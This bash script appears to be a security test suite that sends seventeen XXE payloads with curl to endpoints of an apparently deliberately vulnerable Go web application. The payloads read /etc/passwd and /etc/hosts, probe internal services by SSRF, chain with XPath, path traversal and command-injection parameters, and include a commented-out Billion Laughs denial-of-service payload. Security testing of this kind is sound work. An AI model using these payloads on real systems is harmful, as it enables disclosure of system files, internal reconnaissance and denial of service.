#!/bin/bash

# XXE (XML External Entity) Test Script
# Tests all XXE vulnerabilities in the Go application

BASE_URL="${1:-http://localhost:8080}"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}XXE Vulnerability Test Suite${NC}"
echo -e "${GREEN}Testing: $BASE_URL${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Test 1: Basic XXE - File Disclosure (/etc/passwd)
echo -e "${YELLOW}[Test 1] Basic XXE - File Disclosure (/etc/passwd)${NC}"
curl -s -X POST "$BASE_URL/api/xml/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>' | head -20
echo -e "\n"

# Test 2: XXE via GET parameter
echo -e "${YELLOW}[Test 2] XXE via GET parameter${NC}"
curl -s -G "$BASE_URL/api/xml/parse" \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>' \
  | head -20
echo -e "\n"

# Test 3: XXE - Read /etc/hosts
echo -e "${YELLOW}[Test 3] XXE - File Disclosure (/etc/hosts)${NC}"
curl -s -X POST "$BASE_URL/api/xml/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root>&xxe;</root>'
echo -e "\n"

# Test 4: XXE SSRF - Internal Service
echo -e "${YELLOW}[Test 4] XXE SSRF - Read Internal Service${NC}"
curl -s -X POST "$BASE_URL/api/xml/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:8080/api/debug">]>
<root>&xxe;</root>' | head -30
echo -e "\n"

# Test 5: XXE in Product Feed Import
echo -e "${YELLOW}[Test 5] XXE in Product Feed Import${NC}"
curl -s -X POST "$BASE_URL/api/products/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<products>
  <product id="1">
    <name>Test Product</name>
    <price>99.99</price>
    <description>&xxe;</description>
  </product>
</products>' | head -30
echo -e "\n"

# Test 6: XXE in User Config Import
echo -e "${YELLOW}[Test 6] XXE in User Configuration Import${NC}"
curl -s -X POST "$BASE_URL/api/config/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<config>
  <settings>
    <theme>&xxe;</theme>
  </settings>
</config>' | jq . 2>/dev/null || cat
echo -e "\n"

# Test 7: XXE with XPath Query
echo -e "${YELLOW}[Test 7] XXE + XPath Injection${NC}"
curl -s -X POST "$BASE_URL/api/xpath?xpath=//data/text()" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>' | head -20
echo -e "\n"

# Test 8: XXE via XPath GET parameter
echo -e "${YELLOW}[Test 8] XXE + XPath via GET${NC}"
XML_PAYLOAD='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root><data>&xxe;</data></root>'
curl -s -G "$BASE_URL/api/xpath" \
  --data-urlencode "xml=$XML_PAYLOAD" \
  --data-urlencode 'xpath=//data/text()'
echo -e "\n"

# Test 9: XML Validation with XXE
echo -e "${YELLOW}[Test 9] XXE during XML Validation${NC}"
curl -s -X POST "$BASE_URL/api/xml/validate" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>' | jq . 2>/dev/null || cat
echo -e "\n"

# Test 10: XXE from File Path (Path Traversal combo)
echo -e "${YELLOW}[Test 10] XXE + Path Traversal - Parse from File${NC}"
curl -s "$BASE_URL/api/xml/file?file=/etc/passwd" | head -20
echo -e "\n"

# Test 11: XXE from URL (SSRF combo)
echo -e "${YELLOW}[Test 11] XXE + SSRF - Parse from URL${NC}"
curl -s "$BASE_URL/api/xml/url?url=http://localhost:8080/api/debug" | head -30
echo -e "\n"

# Test 12: XXE in Report Generation
echo -e "${YELLOW}[Test 12] XXE in Report Generation${NC}"
curl -s -X POST "$BASE_URL/api/reports/generate?format=standard" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE report [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<report>
  <title>Monthly Report</title>
  <data>&xxe;</data>
</report>' | head -30
echo -e "\n"

# Test 13: XML Format with Command Injection
echo -e "${YELLOW}[Test 13] XXE + Command Injection via Format Parameter${NC}"
curl -s -X POST "$BASE_URL/api/xml/format?format=--format" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>' | head -30
echo -e "\n"

# Test 14: Parameter Entity Attack
echo -e "${YELLOW}[Test 14] Parameter Entity Attack${NC}"
curl -s -X POST "$BASE_URL/api/xml/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
%xxe;
]>
<foo></foo>' | head -20
echo -e "\n"

# Test 15: Nested XXE
echo -e "${YELLOW}[Test 15] Nested XXE Attack${NC}"
curl -s -X POST "$BASE_URL/api/xml/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY file1 SYSTEM "file:///etc/passwd">
<!ENTITY file2 SYSTEM "file:///etc/hosts">
]>
<root>
  <data1>&file1;</data1>
  <data2>&file2;</data2>
</root>' | head -40
echo -e "\n"

# Test 16: XXE with XPath - Extract Passwords
echo -e "${YELLOW}[Test 16] XXE with XPath - User Password Extraction${NC}"
curl -s -X POST "$BASE_URL/api/xpath?xpath=//user/password/text()" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE users [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<users>
  <user id="1">
    <username>admin</username>
    <password>&xxe;</password>
  </user>
</users>' | head -20
echo -e "\n"

# Test 17: Billion Laughs Attack (DoS) - Use with caution
echo -e "${YELLOW}[Test 17] Billion Laughs Attack (Commented - DoS)${NC}"
echo "# This test is commented out as it may cause DoS"
echo "# Uncomment to test:"
echo '#curl -s -X POST "$BASE_URL/api/xml/parse" \'
echo '#  -H "Content-Type: application/xml" \'
echo "#  -d '<?xml version=\"1.0\"?>"
echo '#<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
echo "#<lolz>&lol2;</lolz>'"
echo -e "\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}XXE Test Suite Completed${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Note: All tests attempt XXE attacks on different endpoints.${NC}"
echo -e "${YELLOW}If you see file contents in responses, the vulnerability is confirmed.${NC}\n"

# HTML Page URLs
echo -e "${GREEN}HTML Test Pages:${NC}"
echo "  - $BASE_URL/xml (Main XML Parser)"
echo "  - $BASE_URL/xml/xpath (XPath Query)"
echo "  - $BASE_URL/xml/products (Product Import)"
echo "  - $BASE_URL/xml/config (Config Import)"
echo ""
